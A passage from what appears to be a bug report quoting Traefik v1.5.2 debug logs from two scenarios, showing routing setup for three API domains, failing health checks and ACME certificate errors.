","weight":10}},"loadbalancer":{"method":"drr"},"healthcheck":{"path":"/","interval":"5s"}}},"frontends":{"dgda-api-v1-fe":{"entrypoints":["http","https"],"backend":"dgda-api-v1","routes":{"dgda-api":{"rule":"host:api.duglemmerdetaldrig.dk"}},"passhostheader":true,"priority":10,"basicauth":null},"tsno-api-v1-fe":{"entrypoints":["http","https"],"backend":"tsno-api-v1","routes":{"tsno-api":{"rule":"host:api.truestory.no"}},"passhostheader":true,"priority":10,"basicauth":null},"tsse-api-v1-fe":{"entrypoints":["http","https"],"backend":"tsse-api-v1","routes":{"tsse-api":{"rule":"host:api.truestory.se"}},"passhostheader":true,"priority":10,"basicauth":null}},"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/ssl-certs/api.duglemmerdetaldrig.dk.pem","keyfile":"/ssl-certs/api.duglemmerdetaldrig.dk.key"}},{"entrypoints":["https"],"certificate":{"certfile":"/ssl-certs/api.truestory.no.pem","keyfile":"/ssl-certs/api.truestory.no.key"}},{"entrypoints":["https"],"certificate":{"certfile":"/ssl-certs/api.truestory.se.pem","keyfile":"/ssl-certs/api.truestory.se.key"}}]}" time="2018-02-23t16:44:53z" level=debug msg="creating frontend dgda-api-v1-fe" time="2018-02-23t16:44:53z" level=debug msg="wiring frontend dgda-api-v1-fe to entrypoint http" time="2018-02-23t16:44:53z" level=debug msg="creating route dgda-api host:api.duglemmerdetaldrig.dk" time="2018-02-23t16:44:53z" level=debug msg="creating backend dgda-api-v1" time="2018-02-23t16:44:53z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:44:53z" level=debug msg="creating server server-3 at with weight 2" time="2018-02-23t16:44:53z" level=debug msg="creating server server-1 at with weight 4" time="2018-02-23t16:44:53z" level=debug msg="creating server server-2 at with weight 2" time="2018-02-23t16:44:53z" level=debug msg="setting up backend health check [path: / port: 8080 interval: 5s]" time="2018-02-23t16:44:53z" level=debug msg="creating retries max attempts 3" time="2018-02-23t16:44:53z" level=debug msg="wiring frontend dgda-api-v1-fe to entrypoint https" time="2018-02-23t16:44:53z" level=debug msg="creating route dgda-api host:api.duglemmerdetaldrig.dk" time="2018-02-23t16:44:53z" level=debug msg="creating backend dgda-api-v1" time="2018-02-23t16:44:53z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:44:53z" level=debug msg="creating server server-3 at with weight 2" time="2018-02-23t16:44:53z" level=debug msg="creating server server-1 at with weight 4" time="2018-02-23t16:44:53z" level=debug msg="creating server server-2 at with weight 2" time="2018-02-23t16:44:53z" level=debug msg="setting up backend health check [path: / port: 8080 interval: 5s]" time="2018-02-23t16:44:53z" level=debug msg="creating retries max attempts 3" time="2018-02-23t16:44:53z" level=debug msg="creating frontend tsno-api-v1-fe" time="2018-02-23t16:44:53z" level=debug msg="wiring frontend tsno-api-v1-fe to entrypoint http" time="2018-02-23t16:44:53z" level=debug msg="creating route tsno-api host:api.truestory.no" time="2018-02-23t16:44:53z" level=debug msg="creating backend tsno-api-v1" time="2018-02-23t16:44:53z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:44:53z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:44:53z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:44:53z" level=debug msg="wiring frontend tsno-api-v1-fe to entrypoint https" time="2018-02-23t16:44:53z" level=debug msg="creating route tsno-api host:api.truestory.no" time="2018-02-23t16:44:53z" level=debug msg="creating backend tsno-api-v1" time="2018-02-23t16:44:53z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:44:53z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:44:53z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:44:53z" level=debug msg="creating frontend tsse-api-v1-fe" time="2018-02-23t16:44:53z" level=debug msg="wiring frontend tsse-api-v1-fe to entrypoint http" time="2018-02-23t16:44:53z" level=debug msg="creating route tsse-api host:api.truestory.se" time="2018-02-23t16:44:53z" level=debug msg="creating backend tsse-api-v1" time="2018-02-23t16:44:53z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:44:53z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:44:53z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:44:53z" level=debug msg="wiring frontend tsse-api-v1-fe to entrypoint https" time="2018-02-23t16:44:53z" level=debug msg="creating route tsse-api host:api.truestory.se" time="2018-02-23t16:44:53z" level=debug msg="creating backend tsse-api-v1" time="2018-02-23t16:44:53z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:44:53z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:44:53z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:44:53z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:44:53z" level=debug msg="initial healthcheck for currentbackend httpstsno-api-v1 " time="2018-02-23t16:44:53z" level=debug msg="initial healthcheck for currentbackend httpsdgda-api-v1 " time="2018-02-23t16:44:53z" level=debug msg="initial healthcheck for currentbackend httptsno-api-v1 " time="2018-02-23t16:44:53z" level=debug msg="initial healthcheck for currentbackend httptsse-api-v1 " time="2018-02-23t16:44:53z" level=debug msg="initial healthcheck for currentbackend httpstsse-api-v1 " time="2018-02-23t16:44:53z" level=debug msg="initial healthcheck for currentbackend httpdgda-api-v1 " time="2018-02-23t16:44:53z" level=debug msg="add certificate for domains *.duglemmerdetaldrig.dk,duglemmerdetaldrig.dk" time="2018-02-23t16:44:53z" level=debug msg="add certificate for domains *.truestory.no,truestory.no" time="2018-02-23t16:44:53z" level=debug msg="add certificate for domains *.truestory.se,truestory.se" time="2018-02-23t16:44:53z" level=info msg="server configuration reloaded on :80" time="2018-02-23t16:44:53z" level=info msg="server configuration reloaded on :443" time="2018-02-23t16:44:53z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:44:53z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:44:53z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:44:53z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: begin servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: forwarding this request to url" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" forwardurl= time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.0.159:8205","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.0.159:8205","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 200, length: 314, duration: 126.160618ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:api.truestory.se" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.0.159:8205","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.0.159:8205","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" time="2018-02-23t16:44:57z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: competed servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["da-dk,da;q=0.9,en-us;q=0.8,en;q=0.7"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36"]},"contentlength":0,"transferencoding":null,"host":"api.truestory.se","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"172.17.0.1:55364","requesturi":"/","tls":null}" time="2018-02-23t16:44:58z" level=debug msg="refreshing healthcheck for currentbackend httpstsno-api-v1 " time="2018-02-23t16:44:58z" level=debug msg="refreshing healthcheck for currentbackend httptsse-api-v1 " time="2018-02-23t16:44:58z" level=debug msg="refreshing healthcheck for currentbackend httpstsse-api-v1 " time="2018-02-23t16:44:58z" level=debug msg="refreshing healthcheck for currentbackend httptsno-api-v1 " time="2018-02-23t16:44:58z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:44:58z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:44:58z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:44:58z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:44:58z" level=debug msg="refreshing healthcheck for currentbackend httpsdgda-api-v1 " time="2018-02-23t16:44:58z" level=debug msg="refreshing healthcheck for currentbackend httpdgda-api-v1 " time="2018-02-23t16:45:02z" level=info msg="i have to go..
interrupt" time="2018-02-23t16:45:02z" level=info msg="stopping server gracefully" time="2018-02-23t16:45:02z" level=debug msg="waiting 0s seconds before killing connections on entrypoint https..." time="2018-02-23t16:45:02z" level=debug msg="wait is over due to: context deadline exceeded" time="2018-02-23t16:45:02z" level=debug msg="waiting 0s seconds before killing connections on entrypoint http..." time="2018-02-23t16:45:02z" level=debug msg="entrypoint https closed" time="2018-02-23t16:45:02z" level=debug msg="entrypoint http closed" time="2018-02-23t16:45:02z" level=info msg="server stopped" time="2018-02-23t16:45:02z" level=info msg="shutting down" ``` </details> #### scenario 2: <details> ```shell
time="2018-02-23t16:45:36z" level=info msg="using toml configuration file /etc/traefik/traefik.toml" time="2018-02-23t16:45:36z" level=info msg="traefik version v1.5.2 built on 2018-02-12_10:56:31am" time="2018-02-23t16:45:36z" level=info msg="
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data
" time="2018-02-23t16:45:36z" level=debug msg="global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"network":"","address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":{"email":"lars@dgda.dk","domains":null,"storage":"/etc/traefik/acme.json","storagefile":"","ondemand":false,"onhostrule":true,"caserver":"","entrypoint":"https","dnschallenge":null,"httpchallenge":null,"dnsprovider":"","delaydontcheckdns":0,"acmelogging":true,"tlsconfig":null},"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":{"attempts":0},"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":null,"file":{"watch":true,"filename":"/etc/traefik/traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":""},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":null,"metrics":null,"ping":null}" time="2018-02-23t16:45:36z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-02-23t16:45:36z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-02-23t16:45:36z" level=info msg="starting server on :80" time="2018-02-23t16:45:36z" level=info msg="loading acme account..." time="2018-02-23t16:45:36z" level=info msg="loaded acme config from store /etc/traefik/acme.json" time="2018-02-23t16:45:36z" level=debug msg="building acme client..." time="2018-02-23t16:45:37z" level=debug msg=agreetotos..
time="2018-02-23t16:45:38z" level=info msg="starting provider *file.provider {"watch":true,"filename":"/etc/traefik/traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":""}" time="2018-02-23t16:45:38z" level=info msg="starting server on :443" time="2018-02-23t16:45:38z" level=info msg="retrieving acme certificates..." time="2018-02-23t16:45:38z" level=info msg="retrieved acme certificates" time="2018-02-23t16:45:38z" level=info msg="testing certificate renew..." time="2018-02-23t16:45:38z" level=debug msg="configuration received from provider file: {"backends":{"dgda-api-v1":{"servers":{"server-1":{"url":" ","weight":4},"server-2":{"url":" ","weight":2},"server-3":{"url":" ","weight":2}},"loadbalancer":{"method":"drr"},"healthcheck":{"path":"/","port":8080,"interval":"5s"}},"tsno-api-v1":{"servers":{"server-1":{"url":" ","weight":10},"server-2":{"url":" ","weight":10}},"loadbalancer":{"method":"drr"},"healthcheck":{"path":"/","interval":"5s"}},"tsse-api-v1":{"servers":{"server-1":{"url":" ","weight":10},"server-2":{"url":" ","weight":10}},"loadbalancer":{"method":"drr"},"healthcheck":{"path":"/","interval":"5s"}}},"frontends":{"dgda-api-v1-fe":{"entrypoints":["http","https"],"backend":"dgda-api-v1","routes":{"dgda-api":{"rule":"host:api.duglemmerdetaldrig.dk"}},"passhostheader":true,"priority":10,"basicauth":null},"tsno-api-v1-fe":{"entrypoints":["http","https"],"backend":"tsno-api-v1","routes":{"tsno-api":{"rule":"host:api.truestory.no"}},"passhostheader":true,"priority":10,"basicauth":null},"tsse-api-v1-fe":{"entrypoints":["http","https"],"backend":"tsse-api-v1","routes":{"tsse-api":{"rule":"host:api.truestory.se"}},"passhostheader":true,"priority":10,"basicauth":null}},"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/ssl-certs/api.duglemmerdetaldrig.dk.pem","keyfile":"/ssl-certs/api.duglemmerdetaldrig.dk.key"}},{"entrypoints":["https"],"certificate":{"certfile":"/ssl-certs/api.truestory.no.pem","keyfile":"/ssl-certs/api.truestory.no.key"}},{"entrypoints":["https"],"certificate":{"certfile":"/ssl-certs/api.truestory.se.pem","keyfile":"/ssl-certs/api.truestory.se.key"}}]}" time="2018-02-23t16:45:38z" level=debug msg="creating frontend dgda-api-v1-fe" time="2018-02-23t16:45:38z" level=debug msg="wiring frontend dgda-api-v1-fe to entrypoint http" time="2018-02-23t16:45:38z" level=debug msg="creating route dgda-api host:api.duglemmerdetaldrig.dk" time="2018-02-23t16:45:38z" level=debug msg="creating backend dgda-api-v1" time="2018-02-23t16:45:38z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:45:38z" level=debug msg="creating server server-1 at with weight 4" time="2018-02-23t16:45:38z" level=debug msg="creating server server-2 at with weight 2" time="2018-02-23t16:45:38z" level=debug msg="creating server server-3 at with weight 2" time="2018-02-23t16:45:38z" level=debug msg="setting up backend health check [path: / port: 8080 interval: 5s]" time="2018-02-23t16:45:38z" level=debug msg="creating retries max attempts 3" time="2018-02-23t16:45:38z" level=debug msg="wiring frontend dgda-api-v1-fe to entrypoint https" time="2018-02-23t16:45:38z" level=debug msg="creating route dgda-api host:api.duglemmerdetaldrig.dk" time="2018-02-23t16:45:38z" level=debug msg="creating backend dgda-api-v1" time="2018-02-23t16:45:38z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:45:38z" level=debug msg="creating server server-1 at with weight 4" time="2018-02-23t16:45:38z" level=debug msg="creating server server-2 at with weight 2" time="2018-02-23t16:45:38z" level=debug msg="creating server server-3 at with weight 2" time="2018-02-23t16:45:38z" level=debug msg="setting up backend health check [path: / port: 8080 interval: 5s]" time="2018-02-23t16:45:38z" level=debug msg="creating retries max attempts 3" time="2018-02-23t16:45:38z" level=debug msg="creating frontend tsno-api-v1-fe" time="2018-02-23t16:45:38z" level=debug msg="wiring frontend tsno-api-v1-fe to entrypoint http" time="2018-02-23t16:45:38z" level=debug msg="creating route tsno-api host:api.truestory.no" time="2018-02-23t16:45:38z" level=debug msg="creating backend tsno-api-v1" time="2018-02-23t16:45:38z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:45:38z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:45:38z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:45:38z" level=debug msg="wiring frontend tsno-api-v1-fe to entrypoint https" time="2018-02-23t16:45:38z" level=debug msg="creating route tsno-api host:api.truestory.no" time="2018-02-23t16:45:38z" level=debug msg="creating backend tsno-api-v1" time="2018-02-23t16:45:38z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:45:38z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:45:38z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:45:38z" level=debug msg="creating frontend tsse-api-v1-fe" time="2018-02-23t16:45:38z" level=debug msg="wiring frontend tsse-api-v1-fe to entrypoint http" time="2018-02-23t16:45:38z" level=debug msg="creating route tsse-api host:api.truestory.se" time="2018-02-23t16:45:38z" level=debug msg="creating backend tsse-api-v1" time="2018-02-23t16:45:38z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:45:38z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:45:38z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:45:38z" level=debug msg="wiring frontend tsse-api-v1-fe to entrypoint https" time="2018-02-23t16:45:38z" level=debug msg="creating route tsse-api host:api.truestory.se" time="2018-02-23t16:45:38z" level=debug msg="creating backend tsse-api-v1" time="2018-02-23t16:45:38z" level=debug msg="creating load-balancer drr" time="2018-02-23t16:45:38z" level=debug msg="creating server server-2 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="creating server server-1 at with weight 10" time="2018-02-23t16:45:38z" level=debug msg="setting up backend health check [path: / port: 0 interval: 5s]" time="2018-02-23t16:45:38z" level=debug msg="creating retries max attempts 2" time="2018-02-23t16:45:38z" level=debug msg="initial healthcheck for currentbackend httptsse-api-v1 " time="2018-02-23t16:45:38z" level=debug msg="initial healthcheck for currentbackend httpstsno-api-v1 " time="2018-02-23t16:45:38z" level=debug msg="initial healthcheck for currentbackend httptsno-api-v1 " time="2018-02-23t16:45:38z" level=debug msg="initial healthcheck for currentbackend httpstsse-api-v1 " time="2018-02-23t16:45:38z" level=debug msg="initial healthcheck for currentbackend httpdgda-api-v1 " time="2018-02-23t16:45:38z" level=debug msg="initial healthcheck for currentbackend httpsdgda-api-v1 " time="2018-02-23t16:45:38z" level=debug msg="add certificate for domains *.duglemmerdetaldrig.dk,duglemmerdetaldrig.dk" time="2018-02-23t16:45:38z" level=debug msg="add certificate for domains *.truestory.no,truestory.no" time="2018-02-23t16:45:38z" level=debug msg="add certificate for domains *.truestory.se,truestory.se" time="2018-02-23t16:45:38z" level=info msg="server configuration reloaded on :80" time="2018-02-23t16:45:38z" level=info msg="server configuration reloaded on :443" time="2018-02-23t16:45:38z" level=debug msg="loadcertificatefordomains [api.duglemmerdetaldrig.dk]..." time="2018-02-23t16:45:38z" level=debug msg="looking for provided certificate to validate [api.duglemmerdetaldrig.dk]..." time="2018-02-23t16:45:38z" level=debug msg="no provided certificate found for domains [api.duglemmerdetaldrig.dk], get acme certificate." time="2018-02-23t16:45:38z" level=debug msg="loading acme certificates [api.duglemmerdetaldrig.dk]..." time="2018-02-23t16:45:38z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:45:38z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:45:38z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:45:38z" level=warning msg="healthcheck has failed [ remove from server list" time="2018-02-23t16:45:40z" level=error msg="map[api.duglemmerdetaldrig.dk:[api.duglemmerdetaldrig.dk] acme: could not determine solvers]" time="2018-02-23t16:45:40z" level=error msg="error getting acme certificates [api.duglemmerdetaldrig.dk] : cannot obtain certificates map[api.duglemmerdetaldrig.dk:[api.duglemmerdetaldrig.dk] acme: could not determine solvers]" time="2018-02-23t16:45:40z" level=debug msg="loadcertificatefordomains [api.truestory.no]..." time="2018-02-23t16:45:40z" level=debug msg="looking for provided certificate to validate [api.truestory.no]..." time="2018-02-23t16:45:40z" level=debug msg="no provided certificate found for domains [api.truestory.no], get acme certificate." time="2018-02-23t16:45:40z" level=debug msg="loading acme certificates [api.truestory.no]..." time="2018-02-23t16:45:41z" level=error msg="map[api.truestory.no:[api.truestory.no] acme: could not determine solvers]" time="2018-02-23t16:45:41z" level=error msg="error getting acme certificates [api.truestory.no] : cannot obtain certificates map[api.truestory.no:[api.truestory.no] acme: could not determine solvers]" time="2018-02-23t16:45:41z" level=debug msg="loadcertificatefordomains [api.truestory.se]..." time="2018-02-23t16:45:41z" level=debug msg="looking for provided certificate to validate [api.truestory.se]..." time="2018-02-23t16:45:41z" level=debug msg="no provided certificate found for domains [api.truestory.se], get acme certificate." time="2018-02-23t16:45:41z" level=debug msg="loading acme certificates [api.truestory.se]..." time="2018-02-23t16:45:42z" level=error msg="map[api.truestory.se:[api.truestory.se] acme: could not determine solvers]" time="2018-02-23t16:45:42z" level=error msg="error getting acme certificates [api.truestory.se] : cannot obtain certificates map[api.truestory.se:[api.truestory.se] acme: could not determine solvers]" time="2018-02-23t16:45:43z" level=debug msg="refreshing healthcheck for currentbackend httptsse-api-v1 " time="2018-02-23t16:45:43z" level=debug msg="refreshing healthcheck for currentbackend httpstsse-api-v1 " time="2018-02-23t16:45:43z" level=debug msg="refreshing healthcheck for currentbackend httpstsno-api-v1 " time="2018-02-23t16:45:43z" level=debug msg="refreshing healthcheck for currentbackend httptsno-api-v1 " time="2018-02-23t16:45:43z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:43z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:43z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:43z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:43z" level=debug msg="refreshing healthcheck for currentbackend httpdgda-api-v1 " time="2018-02-23t16:45:43z" level=debug msg="refreshing healthcheck for currentbackend httpsdgda-api-v1 " time="2018-02-23t16:45:47z" level=debug msg="looking for provided certificate to validate [api.truestory.se]..." time="2018-02-23t16:45:47z" level=debug msg="no provided certificate found for domains [api.truestory.se], get acme certificate." time="2018-02-23t16:45:47z" level=debug msg="looking for an existing acme challenge for api.truestory.se..." time="2018-02-23t16:45:47z" level=debug msg="no certificate found or generated for api.truestory.se" time="2018-02-23t16:45:48z" level=debug msg="refreshing healthcheck for currentbackend httptsse-api-v1 " time="2018-02-23t16:45:48z" level=debug msg="refreshing healthcheck for currentbackend httpstsse-api-v1 " time="2018-02-23t16:45:48z" level=debug msg="refreshing healthcheck for currentbackend httpstsno-api-v1 " time="2018-02-23t16:45:48z" level=debug msg="refreshing healthcheck for currentbackend httptsno-api-v1 " time="2018-02-23t16:45:48z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:48z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:48z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:48z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:48z" level=debug msg="refreshing healthcheck for currentbackend httpsdgda-api-v1 " time="2018-02-23t16:45:48z" level=debug msg="refreshing healthcheck for currentbackend httpdgda-api-v1 " time="2018-02-23t16:45:53z" level=debug msg="refreshing healthcheck for currentbackend httptsse-api-v1 " time="2018-02-23t16:45:53z" level=debug msg="refreshing healthcheck for currentbackend httpstsse-api-v1 " time="2018-02-23t16:45:53z" level=debug msg="refreshing healthcheck for currentbackend httptsno-api-v1 " time="2018-02-23t16:45:53z" level=debug msg="refreshing healthcheck for currentbackend httpstsno-api-v1 " time="2018-02-23t16:45:53z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:53z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:53z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:53z" level=warning msg="healthcheck is still failing [ " time="2018-02-23t16:45:53z" level=debug msg="refreshing 